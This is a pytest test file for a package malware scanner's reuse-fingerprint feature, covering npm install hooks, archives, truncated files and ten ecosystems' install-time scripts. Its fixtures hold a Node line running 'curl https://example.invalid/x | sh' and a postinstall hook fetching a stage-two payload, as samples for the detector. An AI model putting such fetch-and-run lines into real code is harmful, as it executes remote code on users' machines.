"""A scan asked for reuse keys (`reuse_keys`) reports, in the facts record, each code file's reuse fingerprint and each
install hook's shape key: exactly the keys the code-reuse detector looks up, so the keys the platform publishes for a
condemned release catch its next variant. Data files, declaration files and short files have none. A scan not asked
for them reports nothing new: its facts record is byte for byte what it was."""

from __future__ import annotations

import json

import pytest

from cordon_scanner import Scanner
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.intel.malware.reuse_index import HookShape, ReuseIndex
from cordon_scanner.report.facts import ScanFacts

CODE = (
    b"const payload = require('child_process');\npayload.exec('curl https://example.invalid/x | sh');\n"
    * 4
)
HOOK = "node install.js https://example.invalid/stage2"


class Package:
    @staticmethod
    def tree(root):
        (root / "package.json").write_text(
            json.dumps({"name": "demo", "version": "1.0.0", "scripts": {"postinstall": HOOK}}),
            encoding="utf-8",
        )
        (root / "index.js").write_bytes(CODE)
        (root / "types.d.ts").write_bytes(
            b"export declare function demo(input: string): string;\n" * 8
        )
        (root / "data.json").write_text(json.dumps({"k": "v" * 400}), encoding="utf-8")
        return root

    @staticmethod
    def facts(root, *, reuse: bool) -> dict:
        config = Config.default().with_overrides(use_cache=False, reuse_keys=reuse)
        return ScanFacts.of(Scanner(config).scan(root))


class TestAScanAskedForReuseKeys:
    def test_it_reports_the_code_files_fingerprint_and_the_hooks_shape_key(self, tmp_path):
        reuse = Package.facts(Package.tree(tmp_path), reuse=True)["package"]["reuse"]
        assert reuse["fingerprint"] == "crix1" and reuse["complete"] is True
        assert reuse["code"] == [ReuseIndex.fingerprint(CODE).hex()]
        assert reuse["hook"] == [HookShape.key(HOOK).hex()]

    def test_the_same_code_under_another_name_and_spacing_has_the_same_key(self, tmp_path):
        one = tmp_path / "a"
        one.mkdir()
        first = Package.facts(Package.tree(one), reuse=True)
        other = tmp_path / "b"
        other.mkdir()
        Package.tree(other)
        (other / "index.js").unlink()
        (other / "lib.js").write_bytes(CODE.replace(b"\n", b"\n\n  "))
        second = Package.facts(other, reuse=True)
        assert first["package"]["reuse"]["code"] == second["package"]["reuse"]["code"]


class TestAnOrdinaryScan:
    def test_its_facts_record_carries_no_reuse_block(self, tmp_path):
        assert "reuse" not in Package.facts(Package.tree(tmp_path), reuse=False)["package"]


class Collect:
    @staticmethod
    def accumulator():
        from cordon_scanner.engine.pipeline.accumulator import Accumulator

        return Accumulator(reuse_keys=True)

    @staticmethod
    def truncated(path: str, raw: bytes):
        from dataclasses import replace

        from cordon_scanner.foundation.content import FileContent
        from cordon_scanner.foundation.limits import DEFAULT_LIMITS

        small = replace(DEFAULT_LIMITS, max_file_bytes=64, max_stream_bytes=64)
        content = FileContent.from_bytes(path, raw, small)
        assert content.truncated and content.streamed is None
        return content


class TestTheKeysAreTheDetectorsForEveryKindOfFile:
    def test_an_archive_members_key_is_its_whole_files_fingerprint(self, tmp_path):
        import io
        import tarfile

        archive = tmp_path / "demo-1.0.0.tgz"
        with tarfile.open(archive, "w:gz") as tar:
            for name, data in (
                (
                    "package/package.json",
                    json.dumps(
                        {"name": "demo", "version": "1.0.0", "scripts": {"postinstall": HOOK}}
                    ).encode(),
                ),
                ("package/index.js", CODE),
            ):
                info = tarfile.TarInfo(name)
                info.size = len(data)
                tar.addfile(info, io.BytesIO(data))
        reuse = Package.facts(archive, reuse=True)["package"]["reuse"]
        assert reuse["code"] == [ReuseIndex.fingerprint(CODE).hex()] and reuse["hook"] == [
            HookShape.key(HOOK).hex()
        ]

    def test_a_file_held_only_in_part_is_keyed_from_its_file_on_disk_as_the_detector_does(
        self, tmp_path
    ):
        whole = CODE * 20
        on_disk = tmp_path / "big.js"
        on_disk.write_bytes(whole)
        acc = Collect.accumulator()
        acc.scanned("big.js", Collect.truncated("big.js", whole), opens=str(on_disk))
        assert acc.reuse_code == {ReuseIndex.fingerprint(whole).hex()} and acc.reuse_complete

    def test_a_file_held_only_in_part_with_nothing_on_disk_says_its_keys_are_a_part(self):
        acc = Collect.accumulator()
        acc.scanned("big.js", Collect.truncated("big.js", CODE * 20))
        assert acc.reuse_code == set() and acc.reuse_complete is False

    def test_past_the_bound_the_keys_stop_and_say_so(self, monkeypatch):
        from cordon_scanner.engine.pipeline.accumulator import Accumulator
        from cordon_scanner.foundation.content import FileContent

        monkeypatch.setattr(Accumulator, "MAX_REUSE", 2)
        acc = Collect.accumulator()
        for i in range(3):
            body = CODE + f"// variant {i}\n".encode()
            acc.scanned(f"f{i}.js", FileContent.from_bytes(f"f{i}.js", body))
        assert len(acc.reuse_code) == 2 and acc.reuse_complete is False

    def test_a_manifest_that_cannot_be_read_says_its_hooks_are_unknown(self):
        from cordon_scanner.foundation.content import FileContent

        broken = b'{"name": "demo", "scripts": {"postinstall": "node install.js"'
        acc = Collect.accumulator()
        acc.scanned("package.json", FileContent.from_bytes("package.json", broken))
        assert acc.reuse_hooks == set() and acc.reuse_complete is False

    def test_a_manifest_past_its_bound_says_its_hooks_are_unknown(self):
        from cordon_scanner.foundation.content import FileContent
        from cordon_scanner.intel.malware.reuse_index import ReuseKeys

        big = json.dumps(
            {"scripts": {"postinstall": HOOK}, "pad": "x" * (ReuseKeys.MAX_MANIFEST + 10)}
        ).encode()
        acc = Collect.accumulator()
        acc.scanned("package.json", FileContent.from_bytes("package.json", big))
        assert acc.reuse_hooks == set() and acc.reuse_complete is False


#: The file each ecosystem runs at install or build time, and a body for it in its own language. npm also declares
#: command-string hooks in package.json (keyed by their shape above); every other ecosystem runs a file, which is
#: code and so has a code key like any other.
INSTALL_TIME = (
    (
        "pypi",
        "setup.py",
        b"import os\nos.system('echo building the package for this platform now')\n" * 20,
    ),
    (
        "cargo",
        "build.rs",
        b'fn main() { println!("cargo:rerun-if-changed=build.rs and more text here"); }\n' * 20,
    ),
    (
        "rubygems",
        "ext/demo/extconf.rb",
        b"require 'mkmf'\ncreate_makefile('demo_native_extension_here')\n" * 20,
    ),
    (
        "nuget",
        "tools/install.ps1",
        b"param($installPath, $toolsPath, $package, $project)\nWrite-Host done\n" * 20,
    ),
    (
        "conda",
        "info/recipe/post-link.sh",
        b"#!/bin/sh\necho linking the package into the environment now\n" * 20,
    ),
    (
        "cpan",
        "Makefile.PL",
        b"use ExtUtils::MakeMaker;\nWriteMakefile(NAME => 'Demo::Module::Name');\n" * 20,
    ),
    (
        "cran",
        "configure",
        b"#!/bin/sh\necho configuring the native code for this package build\n" * 20,
    ),
    (
        "julia",
        "deps/build.jl",
        b'println("building the native dependency for this package now")\n' * 20,
    ),
    (
        "composer",
        "src/Plugin.php",
        b"<?php\nclass Plugin { public function activate() { echo 'active'; } }\n" * 20,
    ),
    (
        "chocolatey",
        "tools/chocolateyinstall.ps1",
        b"$ErrorActionPreference = 'Stop'\nWrite-Host installing\n" * 20,
    ),
)


class TestEveryEcosystemsInstallTimeCodeIsKeyed:
    @pytest.mark.parametrize(
        "ecosystem,path,body", INSTALL_TIME, ids=[e for e, _, _ in INSTALL_TIME]
    )
    def test_its_install_time_file_has_a_code_key(self, tmp_path, ecosystem, path, body):
        target = tmp_path / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(body)
        reuse = Package.facts(tmp_path, reuse=True)["package"]["reuse"]
        assert ReuseIndex.fingerprint(body).hex() in reuse["code"], (
            f"{ecosystem}: {path} carries no reuse key"
        )
